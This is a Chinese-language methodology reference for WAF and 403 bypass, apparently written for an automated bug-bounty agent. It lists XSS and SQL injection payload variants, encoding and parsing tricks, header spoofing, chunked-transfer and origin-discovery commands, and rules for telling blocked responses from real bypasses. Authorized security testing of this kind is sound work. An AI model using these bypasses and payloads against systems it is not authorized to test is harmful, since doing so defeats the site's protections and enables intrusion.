# WAF 绕过族谱（DeepBounty 专项）

> 汇集 14 家对标中最强的五个来源（详见 `docs/skill-compare.md` WAF 章）：
> pentest-agents `rules/waf-bypass-protocol.md`（7 级阶梯骨架）、communitytools
> `reconnaissance/reference/waf-edge-bypass.md`（边缘/origin 直连）、Agentic-Bug-Hunter
> `commands/bypass-403.md` + `tools/waf_encoder.py` + `waf_response_analyzer.py`（工具化+软阻断判定）、
> Claude-BugHunter `security-arsenal/SKILL.md`（评估顺序方法论）、strix `semantic_confusion.md`（差分心智）。
> 组织方式：**防护类型 → 族 → 变体 → 证据格式**。与 bypass 子代理的「≥3 族」纪律配套，不替代之。

## 0. 核心心智与纪律

- **差分心智**（strix semantic_confusion）：WAF 校验见 A、应用消费 transform(A)——绕过=找两者
  表示不一致的编码/解析路径。每个候选 payload 问：WAF 看到什么？应用最终执行什么？
- **评估顺序**（Claude-BugHunter arsenal）：编码技巧 → 解析歧义 → 协议层 → 厂商规则缺口。
  多数实战在「解析歧义」层终结（WAF 与源站对"合法请求"的定义不一致）。
- **先测绘再绕过**（pentest-agents）：识别 WAF 厂商（`cf-ray`/`x-sucuri`/`x-akamai`/`x-iinfo`/
  TS cookie/`x-amzn` 等头与 cookie 指纹，或 wafw00f），触发一次拦截读错误页，记录厂商与版本。
- **每族 ≥3 变体才换族**（pentest-agents Process Rules）：单变体失败不等于整族失败；
  记录「什么被拦/什么通过」——阻断模式本身揭示 WAF 检查点。
- **时间盒 20 分钟**：全族失败则记录 WAF 画像转其他端点/漏洞类（对齐 deepbounty death_cause 分类）。
- **组合使用**：编码族 + 标签族 + 无关键字族 = 复合绕过。
- **curl 过了还要浏览器验证**：WAF 绕过 + 浏览器执行 = confirmed；仅 curl 反射 = unverified。

## 防护类型 A：签名型 WAF（应用层 payload 被拦，403/406/自定义拦截页）

### 族 A1：编码变换（WAF 查一种编码，服务端解另一种）

| 变体 | 示例 |
|---|---|
| URL 单/双/三层编码 | `%3C` / `%253C` / `%25253C`（WAF 解一次、应用解两次时双编码生效） |
| Unicode 转义 | `script`、JSON body 内关键字中段 `Se\u006cect` |
| HTML 实体 | `&#60;` / `&#x3C;` |
| 超长 UTF-8 | `%C0%BC`（`<` 的非标准 2 字节）、`%E0%80%BC`（3 字节） |
| Null 字节 | `<scri%00pt>`（老解析器） |
| 大小写混合 | `SeLeCt`（现代 WAF 多已 case-fold，单独用 rarely 够，作组合层） |
| Base64/十六进制包装 | SQL 值域 `0x61646d696e` 免引号；XSS `eval(atob('...'))` |

工具：Agentic-Bug-Hunter `tools/waf_encoder.py "<payload>" --class sqli --layers 3`
一次产 20-40 个变体（编码层数/注释/大小写/运算符替换/base64），`--json` 机读输出。

### 族 A2：解析歧义（多数实战终结于此层）

| 变体 | 示例 |
|---|---|
| 注释插入 | `SE/**/LECT`、`UN/**/ION`（`\bunion\b` 正则失效）；MySQL 版本注释 `/*!50000 SELECT*/` |
| 空白替代 | `+`、`%09`（tab）、`%0a`（换行）、`%0c`、`%a0`、空注释 `/**/ ` |
| Content-Type 混淆 | `application/json` ↔ `x-www-form-urlencoded` 互换（两解析器规则集不同）；双 Content-Type 头 |
| multipart 边界混淆 | 重复 filename、boundary 大小写/前后缀变异、LF-only、`filename*=UTF-8''x.php`（RFC 5987）——工具：Agentic-Bug-Hunter `tools/multipart_mutator.py`（10 变体） |
| XML 实体/命名空间 | XML body 内 `<@hex_entities>` 实体编码；XSS 用 `<svg><desc><template>...` 命名空间混淆 |
| 标签平衡怪招 | `<img src=x onerror=alert(1)//`、`<img/src=x/onerror=alert(1)>`、`onerror/=alert(1)` |
| mXSS 变异 | `<math><mtext><table><mglyph><style><!--</style><img src onerror=...>`（序列化/重解析后变异） |

### 族 A3：协议层

| 变体 | 说明 |
|---|---|
| HTTP/2 vs HTTP/1.1 | 部分 WAF 只检其一；h2 走私头部 |
| 分块传输 | `Transfer-Encoding: chunked` 切片 payload（WAF 不重组时） |
| Host 头注入 | 双 Host 头、Host 绝对路径 |
| 改写头 | `X-Original-URL` / `X-Rewrite-URL` 指向受限路径（前端路由放行、后端真执行） |
| 方法篡改 | GET-only 端点试 POST/PUT/PATCH/TRACE；`X-HTTP-Method-Override` |

### 族 A4：厂商规则缺口（先指纹再选用）

| 厂商 | 已知缺口 |
|---|---|
| Cloudflare | TE 分块 + `X-Forwarded-Host` 组合；托管规则集对冷门标签/事件覆盖弱 |
| AWS WAF | `/**/` 注释切割、大 body 截断（>8KB/16KB 视配额不检） |
| Imperva | `%c0%2e` Unicode 路径 |
| F5 ASM | 双斜杠路径、参数名污染 |
| ModSecurity CRS | 偏执等级低时注释/编码族大量存活；按 PL 等级测绘 |

配套：sqlmap tamper 族索引（Agentic-Bug-Hunter 整理）按厂商选用，不盲跑全量。

### 族 A5：上下文逃逸（XSS 特化，先逃出上下文再谈 WAF）

JS 字符串内：`'-alert(1)-'`、`\'-alert(1)//`、`</script><img ...>`；
HTML 属性内：`" onfocus=alert(1) autofocus="`；URL 参数：`javascript:alert(1)//`；
CSS 内：`</style><img ...>`。上下文没逃出时换 payload 无意义。

### 族 A6：无关键字执行（WAF 拦 alert/eval/document/cookie 时）

```text
window['al'+'ert'](1)   self['al'+'ert'](1)   `${alert(1)}`
''['constructor']['constructor']('alert(1)')()
Reflect.apply(alert,null,[1])   import('data:text/javascript,alert(1)')
```

冷门标签/事件（pentest-agents Level 2/3）：`<details open ontoggle=>`、`<marquee onstart=>`、
`onpointerenter`/`onbeforetoggle`/`ontransitionend` 等。

## 防护类型 B：边缘/CDN 拦截（IP 信誉/地理/bot 挑战——连应用都摸不到）

### 族 B1：边缘指纹→拦截类别→有效手法（communitytools 分诊表）

| 边缘 | 指纹 | 拦截类别 | 真正有效的手法 |
|---|---|---|---|
| Akamai | `AkamaiGHost`、`Reference #<hex>` | IP 信誉/地理 | 换干净出口 IP；origin 直连；真实浏览器 |
| Cloudflare | `cf-ray`、1020/1010 challenge | bot 挑战/IP 信誉 | 托管挑战不硬解——origin 直连或真实有头浏览器 |
| Sucuri | `X-Sucuri-ID` | IP 信誉 | origin 发现（同源站常托管在 GoDaddy） |
| Imperva | `X-Iinfo`、`incap_ses` cookie | bot 挑战 | 真实浏览器；origin 直连 |
| F5 XC ASM | 269 字节 `Request Rejected` + Support ID | 签名拦截 | 改写 payload；origin 直连（**不是文件暴露**，见陷阱 1） |
| Vercel | `x-vercel-*`、`/404` catch-all | host 边缘/soft-404 | `*.vercel.app` 别名可绕 host 边缘 |
| CloudFront | `X-Amz-Cf-Id` | 地理/origin-shield | 直连 origin bucket/ALB；换地理出口 |
| AppTrana | `406 Not Acceptable` | 签名拦截 | 改写 payload；origin 直连 |

先分**拦截类别**再动手：IP 信誉（换干净出口）/ 地理（换境外节点）/ bot 挑战（真实浏览器）/
签名拦截（改写 payload，应用可达）。

### 族 B2：Origin 直连发现（既是测试通道又是 High 级发现）

- 同源主机/SAN：`api.`/`origin.`/`direct.`/`cpanel.`/邮件记录常指向未防护源站；枚举证书 SAN（crt.sh）
- CT 日志/被动 DNS：crt.sh、Censys、Shodan `ssl.cert.subject`、SecurityTrails 历史 A 记录（CDN 前的旧记录常还活着）
- 云端点：裸 S3 bucket / ALB DNS / App-Service 默认主机名
- **host-pinned 确认**（关键动作）：
  `curl -sk --resolve <域名>:443:<候选源站IP> https://<域名>/ -w '%{http_code} %{ssl_verify_result}'`
  200 + 源站直出有效证书 = 确认直连暴露。之后整个项目用该通道测试，并**单独报一个 High**：
  「WAF/CDN（厂商）可绕过——源站 `<ip>` 直接提供服务且持有效证书，边缘限流/签名/地理控制全部失效」。

### 族 B3：真实浏览器温和串行回退

bot 挑战且无 origin 时：真实无头/有头浏览器（`chromium --dump-dom` 或真实 Chrome），
单请求、人类节奏、干净出口。Playwright/CDP/curl 都被识别时此路径仍有效。
**必须持久化原始 HTTP 响应+头**（网络事件/HAR），只存渲染 DOM 会因「缺一手证据」被降级。

## 防护类型 C：403/401 访问控制拦截（bypass-403 矩阵，38+ 技）

Agentic-Bug-Hunter `commands/bypass-403.md` 内置矩阵（装了 byp4xx 则直接调）：

| 族 | 变体 |
|---|---|
| IP 伪装头 | `X-Forwarded-For: 127.0.0.1`、`True-Client-IP`、`CF-Connecting-IP`、`X-Originating-IP`、`Client-IP`、`Forwarded`、`X-Remote-Addr`、`Via` |
| 路径技巧 | `/%2e/`、`/%252e/`、`/.xxx`、`/xxx;/`、`/xxx..;/`、`/xxx%20`、`/xxx%09`、`//xxx`、`/./xxx` |
| 后缀技巧 | `/xxx.json`、`/xxx.html`、`/xxx.css`、`/xxx#` |
| 方法篡改 | POST/PUT/PATCH/TRACE 打 GET-only 端点 |
| Content-Type 混淆 | JSON POST、multipart POST、双 CT 头 |
| 厂商特定 | 见族 A4（指纹自动识别后自动套用） |

## 软阻断判定（三档 verdict，防「200 假象」）

WAF 厂商故意对拦截返回 200+挑战页。判定必须基于**阻断基线**而非裸状态码
（Agentic-Bug-Hunter `waf_response_analyzer.py` 加权评分模型）：

| verdict | 条件 |
|---|---|
| bypassed | 状态 ∈ {200,201,204,301,302,401,500,502,503} 且 body ≠ 阻断基线 且无厂商签名 |
| needs_review | 状态正常但 body 含糊（人工复核） |
| blocked | body 命中厂商签名 或 长度≈阻断基线（±5%） |

要点：
- 开工先用已知恶意 payload 采样「阻断基线」（`--calibrate`），学习该目标被拦时长什么样
- **401/500 是绕过胜利**（请求穿过边缘到达后端），不要当失败丢弃
- 拦截页含 Log/Support/Incident ID 时提取存档——报告附上可让厂商查具体触发规则

## 两个假阳性陷阱（communitytools，进 miner 判定纪律）

1. **WAF 拦截页被当文件暴露**：F5 的 269 字节拒绝页、Vercel `/404`、AppTrana `406`、Akamai Reference# 页
   被误报为 `.env`/`.git` 暴露——报文件暴露前先指纹拦截页（不看状态码看 body 特征）。
2. **SPA/Blazor soft-404**：所有路径返回同一 200 shell 页——先打随机乱码路径建基线，
   候选路径的**大小+body 必须与基线不同**才能报存在，禁止只看状态码。

## 证据格式（bypass 突破后回填矩阵）

每条 bypass_attempts 记录：① WAF 厂商指纹与拦截类别 ② 阻断基线（被拦 payload+响应特征）
③ 通过 payload（所属族+变体）④ 通过响应（对照基线的差异）⑤ 浏览器验证结果（XSS 类必需）
⑥ Log ID（若有）。突破后立即写 shared_knowledge（手法+指纹）广播全项目复用。

## 与 deepbounty 机制对接

- bypass 子代理「≥3 族」纪律不变——本文件提供族谱细节与变体清单
- 全族失败 → `bypass_final=true` + death_cause 分类（waf_signature/edge_reputation/bot_challenge/origin_not_found）
- 族 B2 origin 直连确认 = 独立 High 发现，走正常 evidence_gate 提交流程
